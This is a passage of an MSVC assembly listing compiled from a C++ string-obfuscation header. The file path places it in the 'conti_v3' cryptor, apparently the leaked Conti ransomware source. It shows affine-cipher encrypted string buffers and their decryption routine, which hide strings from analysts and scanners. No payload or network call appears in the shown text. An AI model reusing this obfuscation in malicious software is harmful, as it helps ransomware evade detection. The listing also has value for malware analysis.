;	COMDAT ??0?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5f	 mov	 BYTE PTR [rcx+1], 95	; 0000005fH
  00007	c6 41 02 0c	 mov	 BYTE PTR [rcx+2], 12
  0000b	c6 41 03 34	 mov	 BYTE PTR [rcx+3], 52	; 00000034H
  0000f	c6 41 04 0c	 mov	 BYTE PTR [rcx+4], 12
  00013	c6 41 05 23	 mov	 BYTE PTR [rcx+5], 35	; 00000023H
  00017	c6 41 06 0c	 mov	 BYTE PTR [rcx+6], 12
  0001b	c6 41 07 23	 mov	 BYTE PTR [rcx+7], 35	; 00000023H
  0001f	c6 41 08 0c	 mov	 BYTE PTR [rcx+8], 12
  00023	c6 41 09 51	 mov	 BYTE PTR [rcx+9], 81	; 00000051H
  00027	c6 41 0a 0c	 mov	 BYTE PTR [rcx+10], 12
  0002b	c6 41 0b 34	 mov	 BYTE PTR [rcx+11], 52	; 00000034H
  0002f	c6 41 0c 0c	 mov	 BYTE PTR [rcx+12], 12
  00033	c6 41 0d 23	 mov	 BYTE PTR [rcx+13], 35	; 00000023H
  00037	c6 41 0e 0c	 mov	 BYTE PTR [rcx+14], 12
  0003b	c6 41 0f 75	 mov	 BYTE PTR [rcx+15], 117	; 00000075H
  0003f	c6 41 10 0c	 mov	 BYTE PTR [rcx+16], 12
  00043	c6 41 11 1e	 mov	 BYTE PTR [rcx+17], 30
  00047	c6 41 12 0c	 mov	 BYTE PTR [rcx+18], 12
  0004b	c6 41 13 0f	 mov	 BYTE PTR [rcx+19], 15
  0004f	c6 41 14 0c	 mov	 BYTE PTR [rcx+20], 12
  00053	c6 41 15 42	 mov	 BYTE PTR [rcx+21], 66	; 00000042H
  00057	c6 41 16 0c	 mov	 BYTE PTR [rcx+22], 12
  0005b	c6 41 17 75	 mov	 BYTE PTR [rcx+23], 117	; 00000075H
  0005f	c6 41 18 0c	 mov	 BYTE PTR [rcx+24], 12
  00063	c6 41 19 01	 mov	 BYTE PTR [rcx+25], 1
  00067	c6 41 1a 0c	 mov	 BYTE PTR [rcx+26], 12
  0006b	c6 41 1b 00	 mov	 BYTE PTR [rcx+27], 0
  0006f	c6 41 1c 0c	 mov	 BYTE PTR [rcx+28], 12
  00073	c6 41 1d 45	 mov	 BYTE PTR [rcx+29], 69	; 00000045H
  00077	c6 41 1e 0c	 mov	 BYTE PTR [rcx+30], 12
  0007b	c6 41 1f 12	 mov	 BYTE PTR [rcx+31], 18
  0007f	c6 41 20 0c	 mov	 BYTE PTR [rcx+32], 12
  00083	c6 41 21 01	 mov	 BYTE PTR [rcx+33], 1
  00087	c6 41 22 0c	 mov	 BYTE PTR [rcx+34], 12
  0008b	c6 41 23 00	 mov	 BYTE PTR [rcx+35], 0
  0008f	c6 41 24 0c	 mov	 BYTE PTR [rcx+36], 12
  00093	c6 41 25 45	 mov	 BYTE PTR [rcx+37], 69	; 00000045H
  00097	c6 41 26 0c	 mov	 BYTE PTR [rcx+38], 12
  0009b	c6 41 27 34	 mov	 BYTE PTR [rcx+39], 52	; 00000034H
  0009f	c6 41 28 0c	 mov	 BYTE PTR [rcx+40], 12
  000a3	c6 41 29 23	 mov	 BYTE PTR [rcx+41], 35	; 00000023H
  000a7	c6 41 2a 0c	 mov	 BYTE PTR [rcx+42], 12
  000ab	c6 41 2b 75	 mov	 BYTE PTR [rcx+43], 117	; 00000075H
  000af	c6 41 2c 0c	 mov	 BYTE PTR [rcx+44], 12
  000b3	c6 41 2d 00	 mov	 BYTE PTR [rcx+45], 0
  000b7	c6 41 2e 0c	 mov	 BYTE PTR [rcx+46], 12
  000bb	c6 41 2f 0e	 mov	 BYTE PTR [rcx+47], 14
  000bf	c6 41 30 0c	 mov	 BYTE PTR [rcx+48], 12
  000c3	c6 41 31 50	 mov	 BYTE PTR [rcx+49], 80	; 00000050H
  000c7	c6 41 32 0c	 mov	 BYTE PTR [rcx+50], 12
  000cb	c6 41 33 00	 mov	 BYTE PTR [rcx+51], 0
  000cf	c6 41 34 0c	 mov	 BYTE PTR [rcx+52], 12
  000d3	c6 41 35 0b	 mov	 BYTE PTR [rcx+53], 11
  000d7	c6 41 36 0c	 mov	 BYTE PTR [rcx+54], 12
  000db	c6 41 37 00	 mov	 BYTE PTR [rcx+55], 0
  000df	c6 41 38 0c	 mov	 BYTE PTR [rcx+56], 12
  000e3	c6 41 39 75	 mov	 BYTE PTR [rcx+57], 117	; 00000075H
  000e7	c6 41 3a 0c	 mov	 BYTE PTR [rcx+58], 12
  000eb	c6 41 3b 01	 mov	 BYTE PTR [rcx+59], 1
  000ef	c6 41 3c 0c	 mov	 BYTE PTR [rcx+60], 12
  000f3	c6 41 3d 01	 mov	 BYTE PTR [rcx+61], 1
  000f7	c6 41 3e 0c	 mov	 BYTE PTR [rcx+62], 12
  000fb	c6 41 3f 12	 mov	 BYTE PTR [rcx+63], 18
  000ff	c6 41 40 0c	 mov	 BYTE PTR [rcx+64], 12
  00103	c6 41 41 01	 mov	 BYTE PTR [rcx+65], 1
  00107	c6 41 42 0c	 mov	 BYTE PTR [rcx+66], 12
  0010b	c6 41 43 5a	 mov	 BYTE PTR [rcx+67], 90	; 0000005aH
  0010f	c6 41 44 0c	 mov	 BYTE PTR [rcx+68], 12
  00113	c6 41 45 00	 mov	 BYTE PTR [rcx+69], 0
  00117	c6 41 46 0c	 mov	 BYTE PTR [rcx+70], 12
  0011b	c6 41 47 21	 mov	 BYTE PTR [rcx+71], 33	; 00000021H
  0011f	c6 41 48 0c	 mov	 BYTE PTR [rcx+72], 12
  00123	c6 41 49 75	 mov	 BYTE PTR [rcx+73], 117	; 00000075H
  00127	c6 41 4a 0c	 mov	 BYTE PTR [rcx+74], 12
  0012b	c6 41 4b 20	 mov	 BYTE PTR [rcx+75], 32	; 00000020H
  0012f	c6 41 4c 0c	 mov	 BYTE PTR [rcx+76], 12
  00133	c6 41 4d 2f	 mov	 BYTE PTR [rcx+77], 47	; 0000002fH
  00137	c6 41 4e 0c	 mov	 BYTE PTR [rcx+78], 12
  0013b	c6 41 4f 37	 mov	 BYTE PTR [rcx+79], 55	; 00000037H
  0013f	c6 41 50 0c	 mov	 BYTE PTR [rcx+80], 12

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00143	c6 41 51 50	 mov	 BYTE PTR [rcx+81], 80	; 00000050H
  00147	c6 41 52 0c	 mov	 BYTE PTR [rcx+82], 12
  0014b	c6 41 53 20	 mov	 BYTE PTR [rcx+83], 32	; 00000020H
  0014f	c6 41 54 0c	 mov	 BYTE PTR [rcx+84], 12
  00153	c6 41 55 02	 mov	 BYTE PTR [rcx+85], 2
  00157	c6 41 56 0c	 mov	 BYTE PTR [rcx+86], 12
  0015b	c6 41 57 01	 mov	 BYTE PTR [rcx+87], 1
  0015f	c6 41 58 0c	 mov	 BYTE PTR [rcx+88], 12
  00163	c6 41 59 01	 mov	 BYTE PTR [rcx+89], 1
  00167	c6 41 5a 0c	 mov	 BYTE PTR [rcx+90], 12
  0016b	c6 41 5b 12	 mov	 BYTE PTR [rcx+91], 18
  0016f	c6 41 5c 0c	 mov	 BYTE PTR [rcx+92], 12
  00173	c6 41 5d 01	 mov	 BYTE PTR [rcx+93], 1
  00177	c6 41 5e 0c	 mov	 BYTE PTR [rcx+94], 12
  0017b	c6 41 5f 00	 mov	 BYTE PTR [rcx+95], 0
  0017f	c6 41 60 0c	 mov	 BYTE PTR [rcx+96], 12
  00183	c6 41 61 05	 mov	 BYTE PTR [rcx+97], 5
  00187	c6 41 62 0c	 mov	 BYTE PTR [rcx+98], 12
  0018b	c6 41 63 00	 mov	 BYTE PTR [rcx+99], 0
  0018f	c6 41 64 0c	 mov	 BYTE PTR [rcx+100], 12
  00193	c6 41 65 0e	 mov	 BYTE PTR [rcx+101], 14
  00197	c6 41 66 0c	 mov	 BYTE PTR [rcx+102], 12
  0019b	c6 41 67 23	 mov	 BYTE PTR [rcx+103], 35	; 00000023H
  0019f	c6 41 68 0c	 mov	 BYTE PTR [rcx+104], 12
  001a3	c6 41 69 6f	 mov	 BYTE PTR [rcx+105], 111	; 0000006fH
  001a7	c6 41 6a 0c	 mov	 BYTE PTR [rcx+106], 12
  001ab	c6 41 6b 5a	 mov	 BYTE PTR [rcx+107], 90	; 0000005aH
  001af	c6 41 6c 0c	 mov	 BYTE PTR [rcx+108], 12
  001b3	c6 41 6d 0c	 mov	 BYTE PTR [rcx+109], 12
  001b7	c6 41 6e 0c	 mov	 BYTE PTR [rcx+110], 12
  001bb	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]

; 52   :     {
; 53   : 
; 54   :     }

  001bf	48 8b c1	 mov	 rax, rcx
  001c2	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 4e 00 00
	00		 mov	 r11d, 78		; 0000004eH
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 73	 sub	 ecx, 115		; 00000073H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 44	 mov	 BYTE PTR [rcx+1], 68	; 00000044H
  00007	c6 41 02 73	 mov	 BYTE PTR [rcx+2], 115	; 00000073H
  0000b	c6 41 03 1c	 mov	 BYTE PTR [rcx+3], 28
  0000f	c6 41 04 73	 mov	 BYTE PTR [rcx+4], 115	; 00000073H
  00013	c6 41 05 35	 mov	 BYTE PTR [rcx+5], 53	; 00000035H
  00017	c6 41 06 73	 mov	 BYTE PTR [rcx+6], 115	; 00000073H
  0001b	c6 41 07 3f	 mov	 BYTE PTR [rcx+7], 63	; 0000003fH
  0001f	c6 41 08 73	 mov	 BYTE PTR [rcx+8], 115	; 00000073H
  00023	c6 41 09 2d	 mov	 BYTE PTR [rcx+9], 45	; 0000002dH
  00027	c6 41 0a 73	 mov	 BYTE PTR [rcx+10], 115	; 00000073H
  0002b	c6 41 0b 1e	 mov	 BYTE PTR [rcx+11], 30
  0002f	c6 41 0c 73	 mov	 BYTE PTR [rcx+12], 115	; 00000073H
  00033	c6 41 0d 5e	 mov	 BYTE PTR [rcx+13], 94	; 0000005eH
  00037	c6 41 0e 73	 mov	 BYTE PTR [rcx+14], 115	; 00000073H
  0003b	c6 41 0f 08	 mov	 BYTE PTR [rcx+15], 8
  0003f	c6 41 10 73	 mov	 BYTE PTR [rcx+16], 115	; 00000073H
  00043	c6 41 11 41	 mov	 BYTE PTR [rcx+17], 65	; 00000041H
  00047	c6 41 12 73	 mov	 BYTE PTR [rcx+18], 115	; 00000073H
  0004b	c6 41 13 35	 mov	 BYTE PTR [rcx+19], 53	; 00000035H
  0004f	c6 41 14 73	 mov	 BYTE PTR [rcx+20], 115	; 00000073H
  00053	c6 41 15 1e	 mov	 BYTE PTR [rcx+21], 30
  00057	c6 41 16 73	 mov	 BYTE PTR [rcx+22], 115	; 00000073H
  0005b	c6 41 17 6a	 mov	 BYTE PTR [rcx+23], 106	; 0000006aH
  0005f	c6 41 18 73	 mov	 BYTE PTR [rcx+24], 115	; 00000073H
  00063	c6 41 19 66	 mov	 BYTE PTR [rcx+25], 102	; 00000066H
  00067	c6 41 1a 73	 mov	 BYTE PTR [rcx+26], 115	; 00000073H
  0006b	c6 41 1b 62	 mov	 BYTE PTR [rcx+27], 98	; 00000062H
  0006f	c6 41 1c 73	 mov	 BYTE PTR [rcx+28], 115	; 00000073H
  00073	c6 41 1d 41	 mov	 BYTE PTR [rcx+29], 65	; 00000041H
  00077	c6 41 1e 73	 mov	 BYTE PTR [rcx+30], 115	; 00000073H
  0007b	c6 41 1f 1e	 mov	 BYTE PTR [rcx+31], 30
  0007f	c6 41 20 73	 mov	 BYTE PTR [rcx+32], 115	; 00000073H
  00083	c6 41 21 6c	 mov	 BYTE PTR [rcx+33], 108	; 0000006cH
  00087	c6 41 22 73	 mov	 BYTE PTR [rcx+34], 115	; 00000073H
  0008b	c6 41 23 04	 mov	 BYTE PTR [rcx+35], 4
  0008f	c6 41 24 73	 mov	 BYTE PTR [rcx+36], 115	; 00000073H
  00093	c6 41 25 60	 mov	 BYTE PTR [rcx+37], 96	; 00000060H
  00097	c6 41 26 73	 mov	 BYTE PTR [rcx+38], 115	; 00000073H
  0009b	c6 41 27 1e	 mov	 BYTE PTR [rcx+39], 30
  0009f	c6 41 28 73	 mov	 BYTE PTR [rcx+40], 115	; 00000073H
  000a3	c6 41 29 69	 mov	 BYTE PTR [rcx+41], 105	; 00000069H
  000a7	c6 41 2a 73	 mov	 BYTE PTR [rcx+42], 115	; 00000073H
  000ab	c6 41 2b 41	 mov	 BYTE PTR [rcx+43], 65	; 00000041H
  000af	c6 41 2c 73	 mov	 BYTE PTR [rcx+44], 115	; 00000073H
  000b3	c6 41 2d 2d	 mov	 BYTE PTR [rcx+45], 45	; 0000002dH
  000b7	c6 41 2e 73	 mov	 BYTE PTR [rcx+46], 115	; 00000073H
  000bb	c6 41 2f 38	 mov	 BYTE PTR [rcx+47], 56	; 00000038H
  000bf	c6 41 30 73	 mov	 BYTE PTR [rcx+48], 115	; 00000073H
  000c3	c6 41 31 1c	 mov	 BYTE PTR [rcx+49], 28
  000c7	c6 41 32 73	 mov	 BYTE PTR [rcx+50], 115	; 00000073H
  000cb	c6 41 33 04	 mov	 BYTE PTR [rcx+51], 4
  000cf	c6 41 34 73	 mov	 BYTE PTR [rcx+52], 115	; 00000073H
  000d3	c6 41 35 2d	 mov	 BYTE PTR [rcx+53], 45	; 0000002dH
  000d7	c6 41 36 73	 mov	 BYTE PTR [rcx+54], 115	; 00000073H
  000db	c6 41 37 17	 mov	 BYTE PTR [rcx+55], 23
  000df	c6 41 38 73	 mov	 BYTE PTR [rcx+56], 115	; 00000073H
  000e3	c6 41 39 5a	 mov	 BYTE PTR [rcx+57], 90	; 0000005aH
  000e7	c6 41 3a 73	 mov	 BYTE PTR [rcx+58], 115	; 00000073H
  000eb	c6 41 3b 5a	 mov	 BYTE PTR [rcx+59], 90	; 0000005aH
  000ef	c6 41 3c 73	 mov	 BYTE PTR [rcx+60], 115	; 00000073H
  000f3	c6 41 3d 5e	 mov	 BYTE PTR [rcx+61], 94	; 0000005eH
